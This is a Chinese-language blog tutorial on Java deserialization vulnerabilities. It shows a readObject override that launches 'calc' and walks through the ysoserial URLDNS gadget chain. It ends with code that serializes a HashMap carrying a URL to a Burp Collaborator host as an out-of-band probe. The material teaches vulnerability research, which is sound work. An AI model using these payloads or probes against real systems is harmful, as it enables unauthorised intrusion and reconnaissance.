<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>Java反序列化研究 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="Java反序列化研究 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T09:40:56.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">Java反序列化研究</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="0X0-前言"><a href="#0X0-前言" class="headerlink" title="0X0 前言"></a>0X0 前言</h1><p>入Web也有三个月了吧，在这三个月也学到了很多，终于步入了Java安全领域，打算在这里开一个新坑，研究Java的CC链和内存马，以及RMI和JNDI，框架等等，这是一开始想不到的高度，所以写的会尽可能基础详细，可以看懂，加油吧，路还长<br>参考视频：</p>
<p>讲的究极无敌细腻，强推</p>
<ul>
<li>1X1 Java反序列化基础</li>
</ul>
<h1 id="1X1-Java原生序列化和反序列化"><a href="#1X1-Java原生序列化和反序列化" class="headerlink" title="1X1 Java原生序列化和反序列化"></a>1X1 Java原生序列化和反序列化</h1><p>Java中序列化对应的函数为：<code>ObjectOutputStream.WriteObject</code>函数<br>反序列化对应的为：<code>ObjectInputStream.readObject</code>函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.www.base;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">serialize</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">serialize</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;serialize&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670345551026-42a319f1-4a93-4904-b9cb-3f4f688ed7a2.png#averageHue=%239a654d&clientId=u5276e3a1-c236-4&from=paste&height=503&id=u0a6c5517&name=image.png&originHeight=629&originWidth=1418&originalType=binary&ratio=1&rotation=0&showTitle=false&size=122166&status=done&style=none&taskId=u53d166ed-bc7c-434e-b57e-9e06a0a9833&title=&width=1134.4" alt="image.png"><br>正常来说这样会报错，如何解决呢，默认的类是不可以序列化的，要想序列化需要实现一个接口：Serializeable<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670345668893-c721caaa-627d-4634-b401-57a3182d917d.png#averageHue=%2332302e&clientId=u5276e3a1-c236-4&from=paste&height=47&id=ucdfa9358&name=image.png&originHeight=59&originWidth=632&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7937&status=done&style=none&taskId=u5a3ec9c7-56cc-4aeb-933a-4bf95ce7177&title=&width=505.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670345706495-cf7366dc-1903-4fe6-ac82-94384b9dc561.png#averageHue=%238e7c5e&clientId=u5276e3a1-c236-4&from=paste&height=112&id=u2d86d09b&name=image.png&originHeight=140&originWidth=1318&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17387&status=done&style=none&taskId=u9864fe8c-8fe1-48da-8fe2-cce85ed0e54&title=&width=1054.4" alt="image.png"><br>成功写入序列化内容，可以看到部分信息，比如我们传入的名称kino<br>序列化完了之后就该反序列化了吧，接下来就来反序列化：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.www.base;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="comment">//创建对象流</span></span><br><span class="line">        FileInputStream fis=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//读取文件</span></span><br><span class="line">        serialize s=(serialize)ois.readObject();<span class="comment">//反序列化后为object类型，强制转化一下类型</span></span><br><span class="line">        ois.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;over&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670345979458-5f703f1a-5e69-4add-9337-e2629acc1ec5.png#averageHue=%232e2e2d&clientId=u5276e3a1-c236-4&from=paste&height=76&id=u23f34f9b&name=image.png&originHeight=95&originWidth=547&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9537&status=done&style=none&taskId=ue6ac66ce-c442-49ca-8c68-786e1fc5124&title=&width=437.6" alt="image.png"><br>反序列化成功，经过测试发现不强制转换似乎也没什么区别：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670346075635-9ae76b0e-dbc8-495a-8c62-a9bd7eaf46cd.png#averageHue=%23887053&clientId=u5276e3a1-c236-4&from=paste&height=434&id=u6bbf3e7c&name=image.png&originHeight=542&originWidth=1239&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89869&status=done&style=none&taskId=u25766693-30d4-4fc4-96ce-42a82904a22&title=&width=991.2" alt="image.png"><br><strong>这会产生什么安全问题呢？</strong><br>只要服务端反序列化数据，客户端传递的类就会被执行，给予攻击者执行任意代码的权利</p>
<p><strong>可能的形式</strong></p>
<ul>
<li>入口类的readObejct直接调用危险方法</li>
<li>入口类参数包含可控类，可控类里有危险方法</li>
<li>入口类参数包含可控类，该类又调用其他含危险方法的类</li>
<li>构造函数&#x2F;静态代码块等类加载时隐式执行</li>
</ul>
<h2 id="1X1-1-如何执行危险命令"><a href="#1X1-1-如何执行危险命令" class="headerlink" title="1X1.1 如何执行危险命令"></a>1X1.1 如何执行危险命令</h2><p>下面是一个基础案例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.www.base;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">serialize</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>  &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">serialize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;serialize&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.www.base;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        serialize per= <span class="keyword">new</span> <span class="title class_">serialize</span>();</span><br><span class="line">        Serialize(per);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.www.base;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Apply</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">serialize</span> <span class="variable">unserialize</span> <span class="operator">=</span>(serialize)unserialize(<span class="string">&quot;1.bin&quot;</span>);</span><br><span class="line">        System.out.println(unserialize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注意观察，由于我们在<code>serialize</code>类重写了<code>readObject</code>方法，所以当反序列化时，<code>ois.readObject();</code>调用的是重写的<code>readObject</code>方法，因此触发了我们的<code>calc</code>命令</p>
<blockquote>
<p>这种类型是最基础的也是最不可能发生的，一般不可能有人会在服务器写这么危险的类，所以并不太可能发生这种情况，只有我们测试才会手动添加一个</p>
</blockquote>
<h2 id="1x1-2-共同条件"><a href="#1x1-2-共同条件" class="headerlink" title="1x1.2 共同条件"></a>1x1.2 共同条件</h2><ul>
<li>都继承了Serializeable接口</li>
<li>入口类source(重写readObject、参数类型宽泛、jdk自带就更好、常见函数）</li>
<li>调用链(gaget chain)</li>
<li>执行类 sink(ssrf,rce….)</li>
</ul>
<h3 id="1x1-2-1-入口类"><a href="#1x1-2-1-入口类" class="headerlink" title="1x1.2.1 入口类"></a>1x1.2.1 入口类</h3><p>入口类一般是<code>Map,Hashmap,HashTable</code>这些集合类，因为集合类型宽泛（泛型），因此肯定继承了<code>Serializeable</code>接口，在<code>Hashmap</code>类中也重写了<code>readObject</code>方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670865946881-a3064482-bbec-46ac-bffd-67e34e441de3.png#averageHue=%232e2d2c&clientId=u6e6ff7f7-4c87-4&from=paste&height=344&id=u67fa738e&name=image.png&originHeight=430&originWidth=1039&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83023&status=done&style=none&taskId=u1db4f120-ba7f-41e7-900c-82d2ca5761b&title=&width=831.2" alt="image.png"><br>那为什么Hashmap要重写readObject方法呢？<br>在大佬的文章中我得到了答案：</p>
<blockquote>
<p>HashMap中，由于Entry的存放位置是根据Key的Hash值来计算，然后存放到数组中的，对于同一个Key，在不同的JVM实现中计算得出的Hash值可能是不同的。<br>Hash值不同导致的结果就是：有可能一个HashMap对象的反序列化结果与序列化之前的结果不一致。即有可能序列化之前，Key&#x3D;’AAA’的元素放在数组的第0个位置，而反序列化值后，根据Key获取元素的时候，可能需要从数组为2的位置来获取，而此时获取到的数据与序列化之前肯定是不同的</p>
</blockquote>
<h3 id="1X1-2-2-调用链"><a href="#1X1-2-2-调用链" class="headerlink" title="1X1.2.2 调用链"></a>1X1.2.2 调用链</h3><p>所谓调用链就是一条完整的命令执行流程，在入口类中的readObject方法中，最好有一些常见的方法，这样不管我们传什么东西进去，他都可以调用这个方法，也加大了进一步探索的可能<br>调用链中一般会使用很多<strong>重名函数</strong>，为了实现不同的效果</p>
<h3 id="1X1-2-3-执行类"><a href="#1X1-2-3-执行类" class="headerlink" title="1X1.2.3 执行类"></a>1X1.2.3 执行类</h3><p>就是最后RCE的地方，这一部分就至关重要了，要在调用链中找到一个可以执行命令的类，也是相对比较困难的</p>
<h2 id="1x1-3-以ysoserial的URLDNS说起"><a href="#1x1-3-以ysoserial的URLDNS说起" class="headerlink" title="1x1.3 以ysoserial的URLDNS说起"></a>1x1.3 以ysoserial的URLDNS说起</h2><p>ysoserial作为一款github开源的java反序列化工具，内涵CC链，等多条payload，我们选取payload中的URLDNS来讲，该payload的作用是校验target是否存在java反序列化漏洞<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670870298777-87c6d692-57a4-4a51-946c-9c4402517270.png#averageHue=%23fefefd&clientId=u6e6ff7f7-4c87-4&from=paste&height=590&id=uce47016b&name=image.png&originHeight=738&originWidth=1507&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67073&status=done&style=none&taskId=u9ec37f06-b8f7-4f1c-b4db-0535947772f&title=&width=1205.6" alt="image.png"><br>从源码导包可以看出调用的是URL类，接下来我们就从该类去尝试摸一条调用链出来：<br>从上面的共同条件来看，我们已经知道调用链需要满足重写<code>readObject</code>方法，因此我们查看一下<code>Hashmap</code>源码中的readObject：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670870473708-0821b39d-8761-4a0d-acb4-907974a7e0ac.png#averageHue=%232e2e2d&clientId=u6e6ff7f7-4c87-4&from=paste&height=374&id=udeae1502&name=image.png&originHeight=467&originWidth=1249&originalType=binary&ratio=1&rotation=0&showTitle=false&size=108191&status=done&style=none&taskId=ud9689410-b8e8-4093-a217-3d27305be08&title=&width=999.2" alt="image.png"><br>已经是重写了readObject方法，至于原因在上面已经阐述了，重点跟踪到<code>putVal</code>函数：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670870519911-f478b6f0-00fb-4c7d-a50a-1afc5efc83c9.png#averageHue=%232c2c2b&clientId=u6e6ff7f7-4c87-4&from=paste&height=192&id=u705db17f&name=image.png&originHeight=240&originWidth=1136&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30684&status=done&style=none&taskId=u48310ed2-e1fa-41c1-b6da-eebd73d7609&title=&width=908.8" alt="image.png"><br>在readObject方法的最后调用了putVal函数，putVal中调用了<code>hash</code>函数，我们继续跟进：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670870578602-ddf327bb-49c3-48ca-ab05-900c750e4f51.png#averageHue=%232d2c2c&clientId=u6e6ff7f7-4c87-4&from=paste&height=166&id=ufea71964&name=image.png&originHeight=208&originWidth=821&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18414&status=done&style=none&taskId=ue71ee7c7-0a50-4d1d-bc28-9a8c7bd8ac4&title=&width=656.8" alt="image.png"><br>在hash方法中调用了<code>key.hashCode</code>方法，<code>Object key</code>是我们的可控类，也就是我们可以调用可控类中的hashCode方法，这样是之前我为什么强调调用链中需要有常见函数<br>假如我们将URL类传进去会发生什么呢？<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670870672301-3e821de4-af7c-42a0-8557-ff120fbb9f7e.png#averageHue=%232c2c2b&clientId=u6e6ff7f7-4c87-4&from=paste&height=246&id=u21a8a713&name=image.png&originHeight=307&originWidth=921&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30799&status=done&style=none&taskId=u0ea0ab79-a64e-4c4d-a6bd-0ef4f70ecfb&title=&width=736.8" alt="image.png"><br>在URL类也发现了hashCode函数，也就是说假如传入URL的实例对象，那么就会触发<code>URL.HashCode</code>，<strong>并且这里有个判断，假如hashCode不为-1则直接return hashCode，反之就进入我们的目的函数</strong><code>**hashCode**</code><strong>，hashCode属性的默认值即为-1，因此当我们new一个URL对象后，就进入了目标函数！</strong>咱们继续跟进：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670870785540-d94ca857-c0cc-4676-8522-daeab0515e4b.png#averageHue=%232d2c2b&clientId=u6e6ff7f7-4c87-4&from=paste&height=401&id=u6ae0e3ac&name=image.png&originHeight=501&originWidth=902&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48254&status=done&style=none&taskId=u1e243389-de1b-49cc-9614-0f0bf047fa5&title=&width=721.6" alt="image.png"><br>观察到了<code>getHostAddress(u);</code>函数，根据函数名也知道这是获取主机地址的函数，也就是说，假如存在反序列化漏洞，那么我可以传入我们VPS的地址，并开启一个监听，这样就可以校验是否存在Java反序列化漏洞，这就是ysoserial的DNSURL的原理所在，那么我们测试一下实际能否按照我们设想的进行呢？<br>这里利用burp的collaboration功能起一个域名监听，实验代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.www.base;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashmap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://t6069r35pt46go32peqkixc6ixoncc.burpcollaborator.net&quot;</span>),<span class="number">1</span>);</span><br><span class="line">        Serialize(hashmap);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
